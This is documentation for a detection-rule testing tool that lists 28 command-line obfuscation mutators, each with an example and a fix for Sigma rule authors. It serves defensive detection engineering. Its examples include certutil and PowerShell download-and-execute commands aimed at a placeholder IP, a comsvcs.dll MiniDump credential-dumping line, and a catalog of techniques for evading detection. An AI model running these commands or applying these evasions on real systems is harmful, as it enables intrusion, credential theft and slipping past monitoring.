# Mutators

The mutation catalog is the reason Ordeal exists. A unit test asks whether a rule
fires on an event. A mutator asks the adversary's question: what is the cheapest
change to that event that keeps the behavior identical but stops the rule from
firing?

The catalog holds 28 mutators. List it at any time — the command prints the live
registry, so it is always ahead of this page:

```bash
ordeal list mutators
```

<!-- ------------------------------------------------------------ -->

## The Semantics-Preserving Principle

Every mutator obeys one rule: **the mutated command must do the same thing on the
host.** Only its surface form may change. `-enc` and `-EncodedCommand` start the
same PowerShell process. `who^ami` and `whoami` produce the same output. A
mutation that changes behavior is a false finding — it proves nothing about the
rule, because no operator would ever run it.

That constraint is what makes an Ordeal finding actionable. When a mutation
evades a rule, there is no argument to have about whether the variant is
realistic. It is the same attack, written differently, and the rule missed it.

A mutator that cannot prove equivalence declines rather than guesses. Returning
nothing is always the correct answer when the technique does not apply.

Two further constraints keep findings honest rather than merely numerous.

### Only Attacker-Controlled Fields Are Mutated

Fields are classified by name before anything is attacked:

| Class | Fields | Mutated |
| --- | --- | --- |
| Command | `CommandLine`, `ParentCommandLine`, `cmdline`, `Arguments`, `args`, `ScriptBlockText` | Yes |
| Path | `Image`, `ParentImage`, `TargetFilename`, `*path*`, `*directory*` | No |
| Generic | Everything else — hashes, ports, users, event IDs | No |

Command text reflects attacker input verbatim: whatever the operator typed is
what lands in the log. An image path does not. The kernel resolves it and logs
the canonical form regardless of how the process was launched, so mutating
`Image` would model an evasion that cannot happen in production and report a gap
that is not there.

Classification is by name substring, so a source-specific field such as
`process_command_line` is still recognized as command text. If your telemetry
uses a name the heuristic misses, map it with a `config:` in the suite — see
[test-format.md](test-format.md).

### Payload Tokens Are Never Corrupted

A long base64 or hex token is an encoded payload, not a word. Inserting a caret
into it or flipping its case changes what executes, so the token-level and
case-level mutators leave those tokens alone:

```
powershell.exe -enc JABjAGwAaQBlAG4AdAA9AA==
POWERSHELL.EXE -ENC JABjAGwAaQBlAG4AdAA9AA==
```

The command word and the flags flip. The payload does not. The same rule governs
the PowerShell string mutators, which refuse a literal whose body scans as an
encoded blob, and the path mutators, which refuse a `\\?\` or `\\.\` path because
Win32 skips normalization on those and none of the equivalences hold.

### Scope of a Variant

Each variant changes exactly one field, and the rest of the event is copied
unchanged. That isolation is what lets the report name a single cause for each
evasion. Mutators generate; they never evaluate. The runner compiles the rule
once and tests each variant against it.

### Selecting Mutators

Run a subset when you are working a specific gap:

```bash
ordeal mutate ./rules --only windash,flag-abbreviation
ordeal mutate ./rules --skip case-flip
```

<!-- ------------------------------------------------------------ -->

## Command-Token Obfuscation

Six mutators that reshape the command word, its flags, or the whitespace between
them. All six defeat the same underlying weakness: a rule that identifies a
binary by a substring of the typed command line rather than by a resolved field.

### caret-insertion

`T1027` · Insert cmd.exe caret escapes into the command token. cmd strips the
caret before execution, so `who^ami` runs `whoami`.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
power^shell.exe -NoProfile -EncodedCommand SQBFAFgA
```

**Fix.** Carets survive in the logged command line; key on the Image field or
strip `^` before matching.

### powershell-tick

`T1059.001` · Insert PowerShell backtick escapes into the command token. Before
an ordinary character the backtick is a no-op, so ``i`ex`` runs `iex`. Kept
separate from `caret-insertion` because the two model different parsers.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
power`shell.exe -NoProfile -EncodedCommand SQBFAFgA
```

**Fix.** Backticks survive in the command line; key on Image/ParentImage or strip
`` ` `` before matching.

### quote-insertion

`T1027` · Insert empty quote pairs into the command token. Both cmd and
PowerShell strip quotes during argument parsing.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
power""shell.exe -NoProfile -EncodedCommand SQBFAFgA
```

**Fix.** Quotes survive in the command line; key on the Image field or strip
quotes before matching.

### flag-abbreviation

`T1059.001` · Shorten a well-known interpreter flag to the shortest prefix the
parser still accepts. PowerShell resolves any unambiguous parameter prefix, so
`-EncodedCommand` and `-enc` are the same parameter. One variant per flag found,
in sorted order, across `-EncodedCommand`, `-ExecutionPolicy`, `-NoProfile`,
`-WindowStyle`, `-NonInteractive`, `-Command`, `-File`, `-Version`, `-NoLogo`.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
powershell.exe -NoProfile -enc SQBFAFgA
powershell.exe -nop -EncodedCommand SQBFAFgA
```

**Fix.** Match abbreviated forms too, e.g. a regex like `-e(n(c(o...)?)?)?` or key
on a stable prefix.

### case-flip

`backend case-sensitivity` · Invert the case of every non-payload token. Sigma
matching is case-insensitive by specification, so this is a no-op against a
correct native evaluator — that is the point. Converted rules run on Elastic
ES|QL, SPL, KQL, or SQL, several of which are case-sensitive by default. A
finding here means the rule passes locally and misses in production.

```
powershell.exe -enc JABjAGwAaQBlAG4AdAA9AA==
POWERSHELL.EXE -ENC JABjAGwAaQBlAG4AdAA9AA==
```

**Fix.** Ensure the backend comparison is case-insensitive (Sigma's default) or
lowercase the field first.

### whitespace-padding

`T1027` · Expand single spaces into runs. Argument parsers collapse repeated
whitespace, so the padded command runs unchanged, but a literal that spans a
space stops matching.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe
certutil.exe   -urlcache   -f   http://198.51.100.10/a.exe
```

**Fix.** Match individual tokens with separate `|contains` terms rather than a
fixed single-space sequence.

<!-- ------------------------------------------------------------ -->

## Flag Prefix

### windash

`Sigma windash` · Swap the ASCII hyphen flag prefix for an alternative the
Windows argument parser folds back to `-`. Ordeal emits ten: forward slash,
en-dash (U+2013), em-dash (U+2014), hyphen (U+2010), figure dash (U+2012),
horizontal bar (U+2015), minus sign (U+2212), fraction slash (U+2044), division
slash (U+2215), and fullwidth hyphen-minus (U+FF0D). The set comes from Wietze
Beukema's command-line-obfuscation research and the ArgFuscator corpus.

```
certutil.exe -urlcache -split -f http://198.51.100.10/a.exe a.exe
certutil.exe /urlcache /split /f http://198.51.100.10/a.exe a.exe
certutil.exe –urlcache –split –f http://198.51.100.10/a.exe a.exe
certutil.exe ∕urlcache ∕split ∕f http://198.51.100.10/a.exe a.exe
```

**Fix.** Use the `|windash` modifier, or a regex character class such as `[-/]` on
the flag prefix.

Sigma's `|windash` modifier performs that expansion at compile time and is the
right thing to write for a rule bound for SigmaHQ. Ordeal's evaluator
(`bradleyjkemp/sigma-go`) does not implement it yet — a rule using it fails with
`unknown modifier windash` — so enumerate the values for local testing until it
lands.

<!-- ------------------------------------------------------------ -->

## Path

Win32 canonicalizes a path lexically, before the filesystem is ever consulted:
`GetFullPathName` collapses separator runs and removes `.` and `..` segments
without touching the disk. Every path below names the identical file. The
intermediate directory in a traversal need not exist, because nothing looks for
it.

Paths carrying the `\\?\` or `\\.\` prefix skip normalization entirely and are
refused by these mutators. The server and share of a UNC path are resolved by the
redirector, not lexically, and are never rewritten.

### forward-slash-path

`T1027` · Flip `\` path separators to `/`. The Win32 path layer accepts both, and
most interpreters and LOLBins pass the value through unchanged.

```
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump
rundll32.exe C:/Windows/System32/comsvcs.dll,MiniDump
```

**Fix.** Match both separators with a regex like `[\\/]`, or key on the normalized
Image field.

### trailing-dot

`T1036` · Append a trailing dot to each executable name. Windows strips trailing
dots and spaces during canonicalization, so `certutil.exe.` opens `certutil.exe`
— and the extra character defeats `|endswith`.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe
certutil.exe. -urlcache -f http://198.51.100.10/a.exe.
```

**Fix.** Match on the executable stem with `|contains` rather than an exact
`|endswith` boundary, or use Image.

### env-indirection

`T1027` · Replace a well-known absolute path prefix with the equivalent
environment variable. The shell expands it before execution, so the process
starts identically. Covers `C:\Windows\System32`, `C:\Windows`,
`C:\Program Files`, and `C:\Users`, one variant per prefix found.

```
cmd.exe /c C:\Windows\System32\certutil.exe -urlcache -f http://198.51.100.10/a.exe
cmd.exe /c %SystemRoot%\System32\certutil.exe -urlcache -f http://198.51.100.10/a.exe
```

**Fix.** Also match the `%SystemRoot%`/`%ProgramFiles%` forms, or key on the
resolved Image field.

### redundant-separator

`T1027.010` · Double an interior backslash. Canonicalization collapses any run of
separators back to one.

```
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump
rundll32.exe C:\\Windows\System32\comsvcs.dll,MiniDump
```

**Fix.** Collapse separator runs at ingest; prefer `|endswith` on the leaf binary
over a directory-plus-file literal.

### path-dot-segment

`T1027.010` · Insert a redundant `\.\` before the final path component.
Canonicalization drops it outright.

```
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump
rundll32.exe C:\Windows\System32\.\comsvcs.dll,MiniDump
```

**Fix.** Resolve `\.\` and `\..\` in path tokens at ingest; match the leaf with
`|endswith` and assert the directory via a normalized field.

### path-traversal-insertion

`T1027.010` · Insert a directory-then-parent pair that cancels lexically. The
`temp` directory never has to exist. Drive-letter paths only — a `..` under a UNC
share is bounded by the share, which this mutator cannot reason about from the
string alone.

```
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump
rundll32.exe C:\Windows\System32\temp\..\comsvcs.dll,MiniDump
```

**Fix.** Collapse `\..\` at ingest; never anchor a parent-directory-plus-filename
pair — match the filename with a leading separator only.

### exe-extension-omission

`T1027.010` · Drop the `.exe` suffix from the command token. CreateProcess and the
cmd path search append `.exe` when the command carries no extension. Only the
command token is touched: a later argument ending in `.exe` is a file the process
reads or writes.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe
certutil -urlcache -f http://198.51.100.10/a.exe
```

**Fix.** Match the stem in CommandLine and pin the extension on
Image/OriginalFileName, which the kernel resolves canonically.

### short-path-8dot3

`T1036.005` · Replace a well-known long directory with its 8.3 short name.
Substitutions come from a fixed table — `Documents and Settings`,
`Program Files (x86)`, `Program Files`, `ProgramData` — and nothing else. 8.3
names are allocated per volume in creation order, so a short name for an
arbitrary directory cannot be derived from its long name; inventing one would
produce a path that does not resolve.

```
C:\Program Files\Foo\bar.exe -q
C:\PROGRA~1\Foo\bar.exe -q
```

**Fix.** Pin location on Image (the kernel logs the canonical long path); hunt
`~1`/`~2` in CommandLine — modern software rarely emits short paths.

<!-- ------------------------------------------------------------ -->

## cmd.exe

Two mutators that model cmd's own parser rather than the path layer. Both require
a cmd context to fire.

### arg-separator-substitution

`T1027.010` · Replace the delimiter between a cmd.exe payload's command word and
its first argument with a comma. cmd treats space, tab, comma, semicolon and
equals as one interchangeable delimiter set when it splits the command word off
the rest of the line. Only that one delimiter is substituted, and only after a
`/c` or `/k` — the delimiters further along are handed to the target program,
whose own parser splits on whitespace alone.

```
cmd.exe /c ping 127.0.0.1
cmd.exe /c ping,127.0.0.1
```

**Fix.** Never match a literal spanning a token boundary; split multi-token
matches into `CommandLine|contains|all` so any delimiter works.

### env-var-substring-identity

`T1027.010` · Rewrite `%VAR%` as `%VAR:~0%`. cmd's substring syntax is
`%VAR:~offset,length%`; with the length omitted it runs to the end of the value,
so the expansion is identical for every possible value, including the empty one.

```
cmd.exe /c %SystemRoot%\System32\certutil.exe -urlcache -f http://198.51.100.10/a.exe
cmd.exe /c %SystemRoot:~0%\System32\certutil.exe -urlcache -f http://198.51.100.10/a.exe
```

**Fix.** Don't match `%VAR%` literally (expansion happens pre-execution); deploy a
rule for the substring/replacement syntax `%VAR:[~=]`.

<!-- ------------------------------------------------------------ -->

## Network Indicators

Five mutators that restyle an http(s) URL in a command line while leaving the
request the host actually makes unchanged. They exist because a large share of
real Sigma rules pin a download to a literal URL or a dotted-quad IP — both of
which an operator can rewrite for free before touching their tooling.

An octet with a leading zero is refused by the IP mutators: some resolvers read
`010` as octal, so the rewrite would not provably reach the same address.

### ip-decimal

`T1027.010` · Rewrite a dotted-quad IPv4 host in a URL as its 32-bit decimal
form. `inet_addr` and every mainstream HTTP client accept it, so the packet on
the wire is unchanged.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe out
certutil.exe -urlcache -f http://3325256714/a.exe out
```

**Fix.** Don't match IP literals; normalize the URL host to dotted-quad at ingest
and match a derived field, or use `|cidr` on the parsed IP.

### ip-hex

`T1027.010` · The same parse, hexadecimal rendering. `inet_addr` reads a leading
`0x` as hex. Listed separately because a rule can plausibly be hardened against
one notation and not the other.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe out
certutil.exe -urlcache -f http://0xc633640a/a.exe out
```

**Fix.** Same host-normalization fix; treat a URL host of `0x...` or a bare 8-10
digit integer as suspicious in its own right.

### url-default-port

`T1027.010` · State the port the scheme already implies. The TCP connection is
identical and clients elide a default port from the Host header. This defeats the
very common rule shape that anchors on `http://host/` — the trailing slash no
longer follows the host.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe out
certutil.exe -urlcache -f http://198.51.100.10:80/a.exe out
```

**Fix.** Strip default ports during URL normalization; match on the host token
alone, not host + `/`.

### url-percent-encode

`T1027.010` · Percent-encode unreserved characters in the final URL path segment.
RFC 3986 section 2.3 makes an unreserved character and its percent-encoded octet
equivalent. Reserved delimiters are never touched, since encoding those would
change the URL's structure.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe out
certutil.exe -urlcache -f http://198.51.100.10/%61%2Eexe out
```

**Fix.** Percent-decode URL-shaped tokens before matching, or pair URL string
matches with a regex allowing `%XX` between characters.

### url-path-traversal

`T1027.010` · Insert a segment that immediately cancels itself. RFC 3986 section
5.2.4 requires the client to run `remove_dot_segments` before issuing the
request, so the wire request is unchanged — but the command line keeps the longer
form.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe out
certutil.exe -urlcache -f http://198.51.100.10/temp/../a.exe out
```

**Fix.** Match the filename or extension alone, never the full URL path; a `/../`
in a command line is a strong standalone hunt.

<!-- ------------------------------------------------------------ -->

## PowerShell

Six mutators split across two mechanisms. The first three exploit PowerShell's
*resolvers* — the engine resolves commands, .NET types, and members by name
before it runs any code, and each resolver accepts more than one spelling. The
last three rewrite a single-quoted string literal or a parameter name. Neither
CommandLine nor 4104 script-block logging normalizes any of it: the logged text
is what the attacker typed.

All six consult a quote mask first and refuse to substitute inside a string
literal, where a rewrite would change data rather than code.

### cmdlet-alias

`T1027.010` · Replace a cmdlet Verb-Noun with a built-in alias. The command
resolver looks up aliases and cmdlets in the same pass, so the binding is
identical. Only aliases shipping with both Windows PowerShell 5.1 and PowerShell
7 are listed — `curl`, `wget` and `sc` differ across versions and are excluded.
Substitution happens only in command position; `foreach` is restricted to
post-pipe position, where it cannot parse as the loop keyword.

```
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://x/a.ps1')
iex (New-Object System.Net.WebClient).DownloadString('http://x/a.ps1')
```

**Fix.** Enumerate every alias in `CommandLine|contains` lists (or a `|re`
alternation); aliases are not normalized in 4104 script-block logs, so this is a
rule-content fix.

### namespace-shorten

`T1027.010` · Drop a leading `System.` from a .NET type reference. The type
resolver retries any bare name with `System.` prepended. Restricted to an
allowlist of roots with no known colliding twin — `Management.Automation`,
`Reflection`, `Diagnostics`, `Convert`, `Text`, `Net`, `IO` — in both `[Type]`
literals and `New-Object` arguments.

```
(New-Object System.Net.WebClient).DownloadString('http://198.51.100.10/a.ps1')
(New-Object Net.WebClient).DownloadString('http://198.51.100.10/a.ps1')
```

**Fix.** List the `System.`-less twin, or better match the distinctive leaf
(`WebClient`, `FromBase64String`) instead of the qualified path.

### member-name-expression

`T1027.010` · Quote a member name after `.` so it parses as a string expression.
The parser stores both forms as the same constant member name. Requiring the
invoking `(` keeps this to method calls, where the equivalence is unambiguous.

```
(New-Object Net.WebClient).DownloadString('http://198.51.100.10/a.ps1')
(New-Object Net.WebClient).'DownloadString'('http://198.51.100.10/a.ps1')
```

**Fix.** Match `.'Name`, `."Name` and `.(` before a quote; script-block logging
(4104) does not normalize this member-access form.

### string-concat

`T1027.010` · Split a single-quoted literal and rejoin the halves with `+`.
PowerShell concatenates them back before anything sees the value; a rule matching
the contiguous literal only sees the first fragment. The parentheses matter —
without them the `+` binds to whatever precedes the literal.

```
(New-Object Net.WebClient).DownloadString('http://198.51.100.10/a.ps1')
(New-Object Net.WebClient).DownloadString(('http://198.51'+'.100.10/a.ps1'))
```

**Fix.** Stop matching contiguous literals; add a regex for `'+'`-joined quoted
fragments as an obfuscation signal (Elastic 'String Concatenation').

### format-operator

`T1027.010` · Rebuild the literal through the `-f` format operator with its
fragments listed out of order. The runtime string is unchanged while the original
substring never appears in reading order. Literals containing a brace are refused
outright, since `-f` would read it as a format item.

```
(New-Object Net.WebClient).DownloadString('http://198.51.100.10/a.ps1')
(New-Object Net.WebClient).DownloadString(('{1}{0}' -f '.100.10/a.ps1','http://198.51'))
```

**Fix.** Regex for `({\d}){2,}` together with `-f` or `::Format` (Elastic 'String
Reordering'); keep per-keyword leaf matches.

### arg-backtick

`T1027.010` · Insert a backtick into a parameter name. The backtick escapes the
next character, and for an ordinary letter that escape is the letter itself.
Complements `powershell-tick`, which only reshapes the command token and so
misses rules keyed on an argument. Positions that would form a real escape
sequence (`` `n ``, `` `t ``, `` `0 ``, ...) are skipped.

```
powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand SQBFAFgA
powershell.exe -Win`dowStyle Hidden -NoProfile -EncodedCommand SQBFAFgA
```

**Fix.** Strip backticks before matching, or use `|re` with an optional backtick
between characters of high-value keywords.

<!-- ------------------------------------------------------------ -->

## How Scoring Works

For each positive case, Ordeal first confirms the rule fires on the unmodified
event. If it does not, the case is reported `SKIP` — mutation against a rule that
never fired is meaningless, and `ordeal run` already flags that as a failure.

It then generates every applicable variant, tests each one, and counts:

- **Attempted** — variants generated across the event's command fields.
- **Survived** — variants the rule still matched.
- **Evaded** — variants the rule missed, each reported with the mutator, the
  field, the note, the resulting value, and the fix.

The score is `survived / attempted`, printed as `survives X/N evasions (P%)`.

```
BREACH  powershell encoded command fires  survives 7/11 evasions (64%)
        ▲ flag-abbreviation · CommandLine · abbreviated -encodedcommand to -enc
          powershell.exe -NoProfile -enc SQBFAFgA
        ▲ windash · CommandLine · replaced - flag prefix with forward slash
          powershell.exe /NoProfile /EncodedCommand SQBFAFgA
        fix · Match abbreviated forms too, e.g. a regex like -e(n(c(o...)?)?)? or key on a stable prefix.
        fix · Use the |windash modifier, or a regex character class such as [-/] on the flag prefix.

EVADED  1 detections tested, 4 evasions found
```

A **lower score means a more evadable rule**. `100%` means nothing in the catalog
slipped past this case. Any evasion at all exits `1`.

The denominator is not a constant. It depends on how many command fields the case
declares and how many mutators apply to their values — a case whose command line
has no URL generates no network variants at all, and one with no flags generates
no `windash` variants. Compare a case against itself across commits, not against
a different case.

Only positive inline cases are scored. Negative cases have nothing to evade, and
dataset cases cover many events rather than one known-good positive.

That last point is a trap worth naming: a rule whose only positive case is a
`dataset:` case is never attacked. It passes `ordeal run` and reports nothing at
all under `ordeal mutate`. Give every rule at least one inline positive `event:`
case, and use datasets for breadth on top of it.

The catalog is a floor, not a ceiling. Surviving all 28 mutators means the rule
resists the documented techniques Ordeal knows about today; it does not mean the
rule is unevadable. New mutators land through the process in
[CONTRIBUTING.md](../CONTRIBUTING.md) — each one needs a technique citation, a
test that proves the transform, and a test that proves it is a no-op when the
technique does not apply.

---

<sub>Built by <a href="https://principlebreach.com">Principle Breach</a> — offensive security research.</sub>
